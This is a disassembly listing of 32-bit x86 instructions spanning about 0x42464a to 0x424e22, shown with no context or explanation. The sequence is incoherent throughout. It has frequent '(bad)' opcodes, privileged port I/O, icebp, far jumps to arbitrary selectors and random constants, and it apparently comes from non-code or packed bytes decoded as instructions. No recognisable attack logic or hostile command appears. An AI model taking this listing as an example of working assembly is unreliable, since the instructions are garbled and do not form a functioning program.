  42464a:	lods   eax,DWORD PTR ds:[esi]
  42464b:	pop    ebx
  42464c:	mov    ds:0xadcc8b04,al
  424651:	or     ah,BYTE PTR [edi]
  424653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424654:	push   ss
  424655:	pop    edx
  424656:	cmp    eax,0xa30a141b
  42465b:	mov    ds:0x499e8461,eax
  424660:	out    dx,al
  424661:	pop    ds
  424662:	scas   al,BYTE PTR es:[edi]
  424663:	ds mov ebp,0x497d4226
  424669:	ins    BYTE PTR es:[edi],dx
  42466a:	mov    al,ds:0xf554e99c
  42466f:	jo     0x42467b
  424671:	dec    edi
  424672:	or     al,ah
  424674:	xlat   BYTE PTR ds:[ebx]
  424675:	repnz sahf 
  424677:	adc    DWORD PTR [ebp+0x42],eax
  42467a:	sbb    al,0xbf
  42467c:	xor    BYTE PTR [edi-0x1ba1b5],bh
  424682:	cld    
  424683:	or     eax,0x15c8b594
  424688:	mov    ch,0x1b
  42468a:	sub    bl,dl
  42468c:	xlat   BYTE PTR ds:[ebx]
  42468d:	jnp    0x424675
  42468f:	sbb    dh,ah
  424691:	not    eax
  424693:	dec    edi
  424694:	in     al,0xa8
  424696:	sar    BYTE PTR [esi],cl
  424698:	inc    eax
  424699:	pushf  
  42469a:	dec    eax
  42469b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42469c:	out    0x34,eax
  42469e:	test   eax,0xb7b362b2
  4246a3:	in     al,0xcf
  4246a5:	jge    0x424658
  4246a7:	lods   al,BYTE PTR ds:[esi]
  4246a8:	sbb    eax,0xdcfd3a70
  4246ad:	(bad)  
  4246ae:	icebp  
  4246af:	repnz shl eax,cl
  4246b2:	ds push es
  4246b4:	xchg   ecx,eax
  4246b5:	stc    
  4246b6:	imul   BYTE PTR [ecx+ebp*8]
  4246b9:	stos   DWORD PTR es:[edi],eax
  4246ba:	imul   ebp,DWORD PTR [eax-0x378e99e1],0xffffffd3
  4246c1:	pop    ss
  4246c2:	jmp    0x508:0xd6f46ed3
  4246c9:	jl     0x424667
  4246cb:	pop    esi
  4246cc:	adc    al,0xb9
  4246ce:	jmp    0xe94:0x11bf4c1b
  4246d5:	fisubr WORD PTR [ecx]
  4246d7:	mov    bl,0x34
  4246d9:	icebp  
  4246da:	sahf   
  4246db:	push   edx
  4246dc:	clc    
  4246dd:	pop    edi
  4246de:	jmp    FWORD PTR [edi+ecx*4-0x17eb7533]
  4246e5:	mov    edi,0x41065f0f
  4246ea:	mov    ebx,0x6219024e
  4246ef:	mov    al,0xcb
  4246f1:	cdq    
  4246f2:	retf   0xe859
  4246f5:	das    
  4246f6:	cmp    bh,BYTE PTR [ebx-0x55]
  4246f9:	mov    al,0x41
  4246fb:	push   0x9b6113fd
  424700:	rcl    DWORD PTR [ebp-0x33],cl
  424703:	les    eax,FWORD PTR [ecx+0x30]
  424706:	outs   dx,BYTE PTR ds:[esi]
  424707:	scas   eax,DWORD PTR es:[edi]
  424708:	pushf  
  424709:	sbb    BYTE PTR [esp+edi*1],dh
  42470c:	mov    esi,0xc5c6727d
  424711:	(bad)  [eax-0x2bd42777]
  424717:	push   0xcb3d38a9
  42471c:	inc    edi
  42471d:	aas    
  42471e:	stos   BYTE PTR es:[edi],al
  42471f:	xchg   BYTE PTR fs:[edx+0xf588067],dl
  424726:	dec    edx
  424727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424728:	test   eax,0x8a47dbe9
  42472d:	jbe    0x4246fd
  42472f:	test   BYTE PTR [esi],bh
  424731:	pop    esp
  424732:	cmp    DWORD PTR [ecx+0x68ae05e9],edx
  424738:	cdq    
  424739:	in     eax,dx
  42473a:	push   ebx
  42473b:	inc    esp
  42473c:	or     DWORD PTR [eax-0x387f6998],eax
  424742:	(bad)  
  424743:	nop
  424744:	les    ebx,FWORD PTR [ebp-0x3c]
  424747:	ffree  st(6)
  424749:	daa    
  42474a:	sub    esi,DWORD PTR [eax-0x28]
  42474d:	mov    edi,DWORD PTR [esi+0x51e819ec]
  424753:	sahf   
  424754:	pop    ds
  424755:	jmp    0xb711ebdf
  42475a:	jg     0x424778
  42475c:	sub    BYTE PTR [ecx+0x2ee24693],cl
  424762:	int    0xbe
  424764:	xor    DWORD PTR [esi+edx*2+0x57],0x41f3239f
  42476c:	in     eax,dx
  42476d:	mov    edi,0xdbf431ea
  424772:	icebp  
  424773:	frstor [ebp-0x5a8a15d5]
  424779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42477a:	data16 jle 0x4247c1
  42477d:	mov    DWORD PTR [esi+0x10],0xd8c931c6
  424784:	cmp    DWORD PTR [edi-0x584cc9e0],0x50a2949a
  42478e:	push   ecx
  42478f:	mov    eax,ds:0xcd344133
  424794:	xor    eax,ecx
  424796:	cli    
  424797:	sahf   
  424798:	mov    ch,0x10
  42479a:	fidiv  WORD PTR [eax]
  42479c:	call   0x8292:0x77f7a8cf
  4247a3:	or     BYTE PTR [esi],al
  4247a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247a6:	jle    0x424817
  4247a8:	test   eax,0x963389ae
  4247ad:	outs   dx,DWORD PTR ds:[esi]
  4247ae:	faddp  st(4),st
  4247b0:	jb     0x4247d5
  4247b2:	jnp    0x424734
  4247b4:	pop    esi
  4247b5:	jp     0x424815
  4247b7:	(bad)  
  4247b8:	push   0xffffffa9
  4247ba:	add    ebx,DWORD PTR [ebp-0x20]
  4247bd:	in     al,0xd1
  4247bf:	mov    DWORD PTR [edi+ecx*1-0x27],ecx
  4247c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247c4:	fld    QWORD PTR [ecx+edx*2]
  4247c7:	sub    DWORD PTR [ecx+0x44],edi
  4247ca:	retf   
  4247cb:	add    cl,ah
  4247cd:	out    dx,eax
  4247ce:	lea    ecx,[ecx+0x3c7a2fb1]
  4247d4:	push   0xffffffcd
  4247d6:	call   0x55f2c8ad
  4247db:	lods   al,BYTE PTR ds:[esi]
  4247dc:	jmp    0xea091fe0
  4247e1:	dec    ecx
  4247e2:	push   esp
  4247e3:	out    0x5d,eax
  4247e5:	adc    edi,DWORD PTR [ebx]
  4247e7:	mov    ch,0x28
  4247e9:	add    al,0xc9
  4247eb:	test   eax,0x5aab796c
  4247f0:	and    esi,eax
  4247f2:	lahf   
  4247f3:	mov    cl,0x67
  4247f5:	mov    ebp,DWORD PTR [edi-0x4fe30e0]
  4247fb:	cs cmp eax,0xf76dfb1b
  424801:	mov    edx,0xca67beba
  424806:	inc    eax
  424807:	cmp    bh,BYTE PTR [ebp+0x5634af3c]
  42480d:	xchg   DWORD PTR [ebx-0xf],edx
  424810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424811:	inc    eax
  424812:	mov    ds:0xc6e89a6a,eax
  424817:	fdivr  st,st(1)
  424819:	mov    bh,0x2e
  42481b:	lahf   
  42481c:	loopne 0x42488f
  42481e:	lock push ebp
  424820:	imul   edx,DWORD PTR [eax+esi*4+0x22],0xffffffc8
  424825:	fwait
  424826:	inc    ebx
  424827:	jno    0x4247f6
  424829:	and    al,0xa3
  42482b:	arpl   WORD PTR [edi+0x8],cx
  42482e:	push   ebp
  42482f:	adc    eax,0xea414b90
  424834:	add    esi,0x499d5f
  42483a:	add    BYTE PTR [eax],al
  42483c:	mov    esi,0x74ef74ea
  424841:	(bad)  
  424842:	mov    edi,0x98b349fb
  424847:	xor    al,BYTE PTR [edi-0x49c085ef]
  42484d:	rol    DWORD PTR [ecx],0x0
  424850:	test   DWORD PTR [edx],eax
  424852:	add    BYTE PTR [eax],al
  424854:	pop    esp
  424855:	sub    dl,bl
  424857:	push   0x271f992c
  42485c:	(bad)  
  42485d:	fbstp  TBYTE PTR [edx+0x528174f1]
  424863:	std    
  424864:	or     ecx,DWORD PTR [eax+edx*8+0x5f]
  424868:	lods   eax,DWORD PTR ds:[esi]
  424869:	fdiv   DWORD PTR [ebx-0x7bc068d0]
  42486f:	jo     0x424885
  424871:	mov    ah,BYTE PTR [esi]
  424873:	mov    ebx,0x50ef3617
  424878:	or     BYTE PTR [ecx-0x76],0x8
  42487c:	inc    esi
  42487d:	cmp    bh,BYTE PTR [edx-0x34b01d22]
  424883:	add    al,0xbd
  424885:	sahf   
  424886:	mov    dl,0x4f
  424888:	repz das 
  42488a:	mov    al,0x55
  42488c:	mov    ch,0x30
  42488e:	aaa    
  42488f:	aas    
  424890:	or     cl,bh
  424892:	test   DWORD PTR [edx-0x60c1196d],0xb6414e45
  42489c:	mov    ah,0x5f
  42489e:	jle    0x424849
  4248a0:	mov    ds:0x6412fef6,al
  4248a5:	cmc    
  4248a6:	xchg   ebp,eax
  4248a7:	add    edi,DWORD PTR [eax+0x75]
  4248aa:	xchg   ebx,eax
  4248ab:	inc    ebx
  4248ac:	imul   esi,DWORD PTR [edx-0x3c25e0a],0xffffff8c
  4248b3:	cmc    
  4248b4:	mov    eax,ds:0x8a4a4778
  4248b9:	sub    esi,DWORD PTR [ebx+0x63f16ad3]
  4248bf:	xchg   DWORD PTR [edi-0x2a],edx
  4248c2:	jmp    0x97d2e47b
  4248c7:	shl    DWORD PTR [esi+edi*4-0x78bcd52d],cl
  4248ce:	dec    ecx
  4248cf:	jae    0x4248b6
  4248d1:	dec    ebx
  4248d2:	adc    DWORD PTR [eax],edx
  4248d4:	dec    esi
  4248d5:	nop
  4248d6:	and    BYTE PTR [eax],0x7f
  4248d9:	sub    BYTE PTR [ebx+0x40],dh
  4248dc:	xor    ebx,DWORD PTR [edi+esi*1+0xd]
  4248e0:	inc    ebp
  4248e1:	pop    ds
  4248e2:	aam    0xd8
  4248e4:	add    DWORD PTR [edx-0x16959e94],0xc3871878
  4248ee:	push   ds
  4248ef:	(bad)  
  4248f0:	xchg   esp,eax
  4248f1:	iret   
  4248f2:	xchg   esi,eax
  4248f3:	ret    
  4248f4:	bound  eax,QWORD PTR [ebp+0x5a]
  4248f7:	push   cs
  4248f8:	add    BYTE PTR [ebx-0x34],cl
  4248fb:	test   BYTE PTR [edx],cl
  4248fd:	cmp    DWORD PTR [edi+0x1c],eax
  424900:	jo     0x4248d0
  424902:	mov    dl,BYTE PTR [eax+0x3a1a3b4e]
  424908:	inc    esp
  424909:	sti    
  42490a:	mov    edx,0x9f116533
  42490f:	sub    DWORD PTR ds:0x251827cf,edx
  424915:	add    BYTE PTR [esi-0x31],bh
  424918:	mov    ds:0xd37b95a8,eax
  42491d:	outs   dx,DWORD PTR ds:[esi]
  42491e:	push   ss
  42491f:	inc    esi
  424920:	test   BYTE PTR [eax],dl
  424922:	xchg   DWORD PTR [edx],eax
  424924:	mov    esi,0xcd9f0fae
  424929:	mov    al,ds:0x8d415c9c
  42492e:	je     0x424921
  424930:	loope  0x4248d2
  424932:	add    BYTE PTR [esi],ch
  424934:	or     eax,0xd837211a
  424939:	xor    edi,DWORD PTR [edi]
  42493b:	shl    DWORD PTR [eax],1
  42493d:	fwait
  42493e:	mov    ds:0xb2dae3e6,eax
  424943:	hlt    
  424944:	sbb    esi,DWORD PTR [ebx-0x2123b7cf]
  42494a:	aas    
  42494b:	in     al,dx
  42494c:	xor    esp,DWORD PTR [ebx-0x6485ed6e]
  424952:	cs iret 
  424954:	adc    BYTE PTR [edi],0x82
  424957:	mov    dl,0x6b
  424959:	iret   
  42495a:	jmp    0x48ce5bd
  42495f:	in     eax,dx
  424960:	cmp    eax,0x9ff2fae2
  424965:	or     BYTE PTR [edi+0x1bfa4602],bh
  42496b:	gs imul esi,edx,0x67
  42496f:	mov    DWORD PTR [edi+edx*8],eax
  424972:	xor    BYTE PTR [edi],ah
  424974:	out    dx,eax
  424975:	sub    ecx,DWORD PTR [ecx+0x52]
  424978:	xchg   esi,eax
  424979:	jge    0x42495b
  42497b:	adc    ecx,DWORD PTR cs:0x492f0523
  424982:	adc    DWORD PTR [ebx-0x68],esp
  424985:	push   ds
  424986:	jmp    0x9cf0e05b
  42498b:	or     ecx,DWORD PTR [ebx]
  42498d:	sbb    DWORD PTR [ebx+0x64],esi
  424990:	cmp    eax,0xa3cfd8bf
  424995:	jae    0x4249be
  424997:	sub    eax,DWORD PTR [esi-0x3c2ba0b6]
  42499d:	pop    ds
  42499e:	loopne 0x4249e7
  4249a0:	pop    esi
  4249a1:	arpl   sp,ax
  4249a3:	sti    
  4249a4:	ror    esp,cl
  4249a6:	das    
  4249a7:	in     eax,dx
  4249a8:	fiadd  WORD PTR [ecx]
  4249aa:	sub    DWORD PTR [ecx-0x4c],ecx
  4249ad:	mov    bh,BYTE PTR cs:[edx+0x61]
  4249b1:	mov    edx,0xf1f848f1
  4249b6:	mov    DWORD PTR [edx+eiz*4],ebx
  4249b9:	pop    ebx
  4249ba:	mov    eax,0xd2b29a03
  4249bf:	mov    ecx,0xae626aa7
  4249c4:	adc    BYTE PTR [ebx],0x34
  4249c7:	ret    0x37fa
  4249ca:	push   edi
  4249cb:	or     al,0xb8
  4249cd:	fmul   QWORD PTR [edx+0x4843fdec]
  4249d3:	test   DWORD PTR [ebx+0x48decca5],edi
  4249d9:	neg    BYTE PTR [esi]
  4249db:	cmc    
  4249dc:	pop    ebp
  4249dd:	and    eax,0x576b8977
  4249e2:	ja     0x424a39
  4249e4:	and    edx,edx
  4249e6:	dec    esp
  4249e7:	test   DWORD PTR [ecx],ecx
  4249e9:	inc    esi
  4249ea:	dec    DWORD PTR [ecx-0x147ea3ed]
  4249f0:	sub    BYTE PTR [edx+edi*4+0x5789f23a],ch
  4249f7:	push   es
  4249f8:	xor    eax,0x61181b89
  4249fd:	cld    
  4249fe:	sub    eax,0x3e7eae7b
  424a03:	fild   WORD PTR [eax+ebp*1-0x4e]
  424a07:	add    al,0x90
  424a09:	cmc    
  424a0a:	adc    BYTE PTR [ecx+0x3e],dh
  424a0d:	xchg   ebx,eax
  424a0e:	leave  
  424a0f:	loopne 0x424a78
  424a11:	xchg   ecx,eax
  424a12:	dec    ebx
  424a13:	sub    eax,0x9987c615
  424a18:	lock or DWORD PTR [ecx+0x50],esi
  424a1c:	jnp    0x4249e4
  424a1e:	(bad)  
  424a1f:	dec    ebp
  424a20:	sbb    eax,0x5222a3bb
  424a25:	add    ebx,DWORD PTR [ebp-0x58]
  424a28:	cld    
  424a29:	(bad)  
  424a2a:	mov    eax,ds:0x61d55b8a
  424a2f:	jp     0x424a63
  424a31:	or     DWORD PTR [esi],esi
  424a33:	mov    edi,0xc06f8568
  424a38:	push   0xaa7fd51d
  424a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a3e:	pop    ebx
  424a3f:	scas   eax,DWORD PTR es:[edi]
  424a40:	enter  0xcf2,0x39
  424a44:	inc    edi
  424a45:	add    BYTE PTR [eax-0x4ff5b4ce],dl
  424a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a4c:	imul   ebp,DWORD PTR [edx+0x4],0xffffffb4
  424a50:	je     0x4249e4
  424a52:	inc    esi
  424a53:	bound  esi,QWORD PTR [esi]
  424a55:	push   ecx
  424a56:	xchg   ebx,eax
  424a57:	(bad)  
  424a59:	jge    0x4249fd
  424a5b:	pop    edx
  424a5c:	lea    edx,[edi]
  424a5e:	mov    BYTE PTR [esi-0x43],ch
  424a61:	sbb    al,0x99
  424a63:	outs   dx,DWORD PTR ds:[esi]
  424a64:	xchg   ecx,eax
  424a65:	(bad)  
  424a67:	sub    al,0x8d
  424a69:	and    BYTE PTR [edx],cl
  424a6b:	stos   DWORD PTR es:[edi],eax
  424a6c:	mov    WORD PTR [ecx+ebx*4],?
  424a6f:	adc    eax,0xb37723ee
  424a74:	jns    0x424a33
  424a76:	push   es
  424a77:	mov    al,ds:0xe222264c
  424a7c:	inc    ebp
  424a7d:	jecxz  0x424acc
  424a7f:	aad    0xf9
  424a81:	call   0x75e317e0
  424a86:	inc    edi
  424a87:	cs jns 0x424a7d
  424a8a:	pusha  
  424a8b:	std    
  424a8c:	mov    ebp,0x9f6e825f
  424a91:	mov    ebp,0x24077e7b
  424a96:	lahf   
  424a97:	mov    ds:0x6bdc1578,al
  424a9c:	into   
  424a9d:	lea    esi,[ebx+0x186e45d4]
  424aa3:	push   edx
  424aa4:	cli    
  424aa5:	sub    BYTE PTR [ebp-0x20ee1280],al
  424aab:	jmp    0x424a8c
  424aad:	sub    DWORD PTR [edx-0x61de5f65],eax
  424ab3:	dec    ebp
  424ab4:	xchg   BYTE PTR [ecx+0x4a],ah
  424ab7:	pop    ebx
  424ab8:	int3   
  424ab9:	mov    WORD PTR [ebx],ds
  424abb:	pop    ds
  424abc:	sub    esi,0x1fbbfdf7
  424ac2:	loopne 0x424ab1
  424ac4:	mov    WORD PTR [ebp+0x6f9c4374],es
  424aca:	fistp  DWORD PTR [eax+0x4c4c06c3]
  424ad0:	or     dl,al
  424ad2:	jle    0x424af6
  424ad4:	xor    esp,esi
  424ad6:	pop    edi
  424ad7:	mov    ecx,0xdb
  424adc:	dec    ebx
  424add:	inc    ebp
  424ade:	mov    edx,0x5fffbeee
  424ae3:	in     eax,0x54
  424ae5:	stos   BYTE PTR es:[edi],al
  424ae6:	clc    
  424ae7:	adc    ebp,ebp
  424ae9:	ret    
  424aea:	mov    ds:0x1c43b4f,al
  424aef:	add    BYTE PTR [ebp+0x74000002],al
  424af5:	pop    edx
  424af6:	aad    0x66
  424af8:	(bad)  
  424af9:	int3   
  424afa:	jae    0x424a8c
  424afc:	push   ebx
  424afd:	mov    esp,0x7876be3e
  424b02:	jecxz  0x424a8e
  424b04:	sahf   
  424b05:	and    ecx,DWORD PTR [esi]
  424b07:	test   BYTE PTR [esi+0x5f],dh
  424b0a:	jnp    0x424b38
  424b0c:	jns    0x424b03
  424b0e:	dec    ecx
  424b0f:	popf   
  424b10:	jecxz  0x424b5d
  424b12:	nop
  424b13:	pop    ebx
  424b14:	retf   0x5655
  424b17:	out    0xf1,eax
  424b19:	add    ecx,edi
  424b1b:	mov    eax,0xe508178f
  424b20:	cmp    ah,BYTE PTR [ecx-0x73]
  424b23:	mov    eax,ds:0xc00523d3
  424b28:	nop
  424b29:	mov    cl,0x72
  424b2b:	pushf  
  424b2c:	push   0xffffff90
  424b2e:	jo     0x424b07
  424b30:	out    0xcd,al
  424b32:	bound  ecx,QWORD PTR [ebx-0x52]
  424b35:	popf   
  424b36:	pop    ss
  424b37:	dec    ecx
  424b38:	mov    bh,0x9d
  424b3a:	pop    ebp
  424b3b:	adc    ecx,ebp
  424b3d:	dec    esi
  424b3e:	ret    0xa14f
  424b41:	dec    edi
  424b42:	push   ss
  424b43:	adc    al,0x48
  424b45:	shl    BYTE PTR [ebx+0x68],1
  424b48:	loop   0x424b88
  424b4a:	mov    al,0xcc
  424b4c:	aam    0xd4
  424b4e:	frstor [edi+eax*4]
  424b51:	ret    0x28da
  424b54:	cmp    ebx,DWORD PTR [esi]
  424b56:	sbb    eax,0xce801d70
  424b5b:	sbb    bl,dl
  424b5d:	mov    esp,0x3f37b545
  424b62:	push   edx
  424b63:	push   ds
  424b64:	in     al,0x23
  424b66:	int    0x86
  424b68:	sub    BYTE PTR [eax],ch
  424b6a:	fcmove st,st(3)
  424b6c:	cmp    DWORD PTR [eax+ebx*1+0x3527fbed],ecx
  424b73:	push   ds
  424b74:	push   esp
  424b75:	xchg   edx,eax
  424b76:	cmp    edi,ebx
  424b78:	ret    0xb235
  424b7b:	xchg   esi,eax
  424b7c:	jbe    0x424b31
  424b7e:	les    esi,FWORD PTR [ecx]
  424b80:	lds    esp,FWORD PTR [edx+ebp*2+0x685a09f9]
  424b87:	loopne 0x424b7e
  424b89:	mov    edi,0x7b27d60d
  424b8e:	test   DWORD PTR [esi],ebp
  424b90:	cld    
  424b91:	fwait
  424b92:	jnp    0x424bf0
  424b94:	cmp    BYTE PTR [ecx-0x5],bh
  424b97:	pop    ss
  424b98:	cmp    al,0x4c
  424b9a:	push   ecx
  424b9b:	jmp    0x424b63
  424b9d:	inc    eax
  424b9e:	in     eax,dx
  424b9f:	fwait
  424ba0:	inc    edx
  424ba1:	gs dec esi
  424ba3:	mov    al,ds:0x37dca672
  424ba8:	pop    esp
  424ba9:	shl    DWORD PTR [edx+0x634d7d59],cl
  424baf:	cdq    
  424bb0:	mov    ch,0xc6
  424bb2:	div    BYTE PTR [eax+0x68]
  424bb5:	shl    esp,1
  424bb7:	(bad)  
  424bb8:	retf   
  424bb9:	dec    edi
  424bba:	sub    ecx,DWORD PTR [eax+0x55c86780]
  424bc0:	xor    DWORD PTR [eax+0x40],ebp
  424bc3:	dec    esp
  424bc4:	jno    0x424bc3
  424bc6:	push   edx
  424bc7:	sub    BYTE PTR [ebx+ecx*2-0x1f912da1],dl
  424bce:	leave  
  424bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bd0:	iret   
  424bd1:	xor    ebx,DWORD PTR [ecx-0x45]
  424bd4:	je     0x424b66
  424bd6:	sbb    al,0xdd
  424bd8:	jge    0x424b93
  424bda:	and    dh,cl
  424bdc:	fnstenv [esi+0xd]
  424bdf:	sub    ecx,eax
  424be1:	sbb    esp,DWORD PTR [eax+0x295f5d87]
  424be7:	pop    edi
  424be8:	lock inc esp
  424bea:	xchg   edi,eax
  424beb:	or     eax,0xa7bc9ae6
  424bf0:	retf   
  424bf1:	lods   al,BYTE PTR ds:[esi]
  424bf2:	mov    ebx,0xa312a2
  424bf7:	xchg   edx,eax
  424bf8:	pushf  
  424bf9:	jb     0x424bcc
  424bfb:	fwait
  424bfc:	repnz sub eax,0xf113dad4
  424c02:	(bad)  
  424c03:	repz dec esp
  424c05:	aaa    
  424c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c07:	sbb    eax,0xa67b25e9
  424c0c:	fisttp QWORD PTR [ebp+0x5f2de5f4]
  424c12:	push   edi
  424c13:	lahf   
  424c14:	mov    cl,0x8f
  424c16:	sar    cl,0x82
  424c19:	(bad)  
  424c1a:	(bad)  
  424c1b:	shr    DWORD PTR [ebp+eax*4+0x54],cl
  424c1f:	ret    0x6391
  424c22:	dec    edx
  424c23:	scas   eax,DWORD PTR es:[edi]
  424c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c25:	xchg   ecx,eax
  424c26:	mov    esp,0x4724847c
  424c2b:	push   es
  424c2c:	push   esp
  424c2d:	fcom   DWORD PTR ds:0x2a95f18d
  424c33:	adc    bl,BYTE PTR ds:0x32838f9d
  424c39:	(bad)  
  424c3a:	jns    0x7aa65fcc
  424c40:	sti    
  424c41:	jmp    0x3015e71e
  424c46:	xchg   esi,eax
  424c47:	out    dx,al
  424c48:	dec    eax
  424c49:	xlat   BYTE PTR ds:[ebx]
  424c4a:	call   0x61086603
  424c4f:	jno    0x424c64
  424c51:	or     ah,cl
  424c53:	imul   eax,esp,0xffffffb5
  424c56:	stos   BYTE PTR es:[edi],al
  424c57:	scas   al,BYTE PTR es:[edi]
  424c58:	xchg   edi,eax
  424c59:	mov    esp,0xf301fe65
  424c5e:	lds    ebp,FWORD PTR [edi+esi*4-0x5e]
  424c62:	inc    esi
  424c63:	adc    DWORD PTR [ebx],ecx
  424c65:	cmp    al,0xcf
  424c67:	pop    edi
  424c68:	jo     0x424cbb
  424c6a:	cmp    DWORD PTR [ecx+eiz*4],ecx
  424c6d:	push   ds
  424c6e:	lea    edi,[ebx+0x38c4448e]
  424c74:	or     ecx,ecx
  424c76:	ja     0x424c8a
  424c78:	mov    cl,0xf6
  424c7a:	xor    al,0x17
  424c7c:	adc    al,0x75
  424c7e:	daa    
  424c7f:	imul   esp,DWORD PTR [eax],0x95ece14e
  424c85:	sahf   
  424c86:	arpl   WORD PTR [ebx],sp
  424c88:	out    dx,al
  424c89:	mov    ecx,0x770eb823
  424c8e:	repz pop ds
  424c90:	inc    esi
  424c91:	add    esi,edi
  424c93:	leave  
  424c94:	int    0xcd
  424c96:	lods   al,BYTE PTR ds:[esi]
  424c97:	pop    ds
  424c98:	cmp    al,0xcb
  424c9a:	out    dx,eax
  424c9b:	mov    bh,0xae
  424c9d:	mov    DWORD PTR [ebx],ebx
  424c9f:	les    esp,FWORD PTR [esp+eax*8+0x1efee970]
  424ca6:	xor    DWORD PTR [ecx],edi
  424ca8:	push   esi
  424ca9:	sbb    ah,BYTE PTR [edx+ebx*4+0x2943a634]
  424cb0:	arpl   WORD PTR [esi],sp
  424cb2:	(bad)  
  424cb3:	fcom   st(5)
  424cb5:	pushf  
  424cb6:	rcr    DWORD PTR [ebp+0x6ace7d48],1
  424cbc:	in     eax,0x31
  424cbe:	dec    esi
  424cbf:	sbb    DWORD PTR [edx+0x1f],esi
  424cc2:	test   BYTE PTR [eax],dl
  424cc4:	add    ebx,DWORD PTR [eax+ebx*2]
  424cc7:	int    0xbe
  424cc9:	mov    esi,0x2de830be
  424cce:	mov    edx,0xf35f5528
  424cd3:	sub    eax,DWORD PTR [ebp+0x60]
  424cd6:	push   ecx
  424cd7:	mov    edi,0xe24768d8
  424cdc:	inc    edi
  424cdd:	mov    ah,0xac
  424cdf:	lods   al,BYTE PTR ds:[esi]
  424ce0:	retf   0x7eb2
  424ce3:	repz xchg esp,eax
  424ce5:	fxch   st(0)
  424ce7:	mov    ebp,0x8fab0173
  424cec:	and    BYTE PTR [ebp+0x52],al
  424cef:	mov    edi,0xe7cc1eb3
  424cf4:	add    BYTE PTR [edx-0x23cf5d45],ah
  424cfa:	jg     0x424ca4
  424cfc:	pop    ss
  424cfd:	outs   dx,BYTE PTR ds:[esi]
  424cfe:	scas   eax,DWORD PTR es:[edi]
  424cff:	(bad)  
  424d00:	ror    DWORD PTR [edi-0x17938520],1
  424d06:	es push eax
  424d08:	push   cs
  424d09:	mov    bh,ah
  424d0b:	xchg   ebx,eax
  424d0c:	sbb    ecx,DWORD PTR gs:[esi+0x15]
  424d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d11:	or     edi,DWORD PTR [ecx]
  424d13:	out    dx,al
  424d14:	inc    edx
  424d15:	cld    
  424d16:	sub    ch,ch
  424d18:	lods   al,BYTE PTR ds:[esi]
  424d19:	aam    0xa9
  424d1b:	repz sub bl,BYTE PTR [edx+ecx*1+0x3a]
  424d20:	adc    eax,0xe42c6ee9
  424d25:	xchg   edx,eax
  424d26:	call   0x206edda9
  424d2b:	fwait
  424d2c:	es dec eax
  424d2e:	(bad)  
  424d2f:	cld    
  424d30:	push   eax
  424d31:	mov    dh,BYTE PTR [ebp+0x29d40466]
  424d37:	test   eax,0xf39e15af
  424d3c:	mov    eax,DWORD PTR [ecx-0x243890f6]
  424d42:	or     DWORD PTR [ebx+0x7f3d5d96],esp
  424d48:	(bad)  
  424d49:	(bad)  
  424d4a:	mov    esp,0xe9c7003c
  424d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d50:	cmp    eax,edi
  424d52:	push   ds
  424d53:	and    eax,0x824105ec
  424d58:	sbb    ah,0xe1
  424d5b:	jecxz  0x424dd4
  424d5d:	push   ss
  424d5e:	ins    DWORD PTR es:[edi],dx
  424d5f:	or     DWORD PTR [ebx-0x73012fa2],ebx
  424d65:	retf   0xfc7a
  424d68:	mov    cl,BYTE PTR [ecx+ecx*2+0x57959ddf]
  424d6f:	jg     0x424d74
  424d71:	cs jae 0x424d42
  424d74:	and    al,0x7e
  424d76:	dec    esi
  424d77:	sti    
  424d78:	les    eax,FWORD PTR [eax]
  424d7a:	add    BYTE PTR [eax],al
  424d7c:	stos   BYTE PTR es:[edi],al
  424d7d:	jo     0x424d5f
  424d7f:	dec    ecx
  424d80:	cli    
  424d81:	fldcw  WORD PTR [ebx-0x35bf70d]
  424d87:	loopne 0x424dd8
  424d89:	mov    ?,WORD PTR [ecx+edi*8-0x40]
  424d8d:	mov    BYTE PTR [ecx],0x0
  424d90:	test   DWORD PTR [edx],eax
  424d92:	add    BYTE PTR [eax],al
  424d94:	mov    eax,ds:0x43020b08
  424d99:	sbb    eax,0x391b369e
  424d9f:	sub    edx,DWORD PTR ds:0x543c7d85
  424da5:	inc    ebp
  424da6:	push   ebp
  424da7:	pop    ss
  424da8:	xchg   edi,eax
  424da9:	rol    cl,0xac
  424dac:	leave  
  424dad:	inc    ebp
  424dae:	xor    BYTE PTR [eax-0x43],0x1b
  424db2:	bound  esi,QWORD PTR [ebp+ebx*2+0x74c34619]
  424db9:	test   eax,0x44c547e0
  424dbe:	pop    ebx
  424dbf:	jmp    0x1cc5ea7c
  424dc4:	inc    eax
  424dc5:	les    edx,FWORD PTR ds:0xc396e133
  424dcb:	or     DWORD PTR [ebx+0x1068b646],esi
  424dd1:	fidivr WORD PTR [edi-0x472d35ed]
  424dd7:	ss sub eax,0x3c0f4a1e
  424ddd:	add    ebx,eax
  424ddf:	int3   
  424de0:	inc    ecx
  424de1:	add    DWORD PTR [ebx+0x30],0xe64006e6
  424de8:	inc    ebp
  424de9:	push   ebp
  424dea:	add    eax,0x6dd7b915
  424def:	stc    
  424df0:	out    dx,al
  424df1:	lods   al,BYTE PTR ds:[esi]
  424df2:	mov    dl,0x63
  424df4:	add    eax,0x1e5d4a1c
  424df9:	pushf  
  424dfa:	pop    esi
  424dfb:	test   eax,0xadc33658
  424e01:	pop    edx
  424e02:	mov    esi,0x40ba8779
  424e07:	cmc    
  424e08:	shr    ah,1
  424e0a:	sbb    al,BYTE PTR [ebx-0x1eb5ab07]
  424e10:	hlt    
  424e11:	inc    esp
  424e12:	sti    
  424e13:	fmul   QWORD PTR [ebx]
  424e15:	lock cld 
  424e17:	shl    DWORD PTR [ebp+0x3c],0x1d
  424e1b:	cmp    al,dh
  424e1d:	les    edi,FWORD PTR [ecx]
  424e1f:	sub    bh,BYTE PTR [ebp-0x73]
  424e22:	mov    esi,0x95a1866a
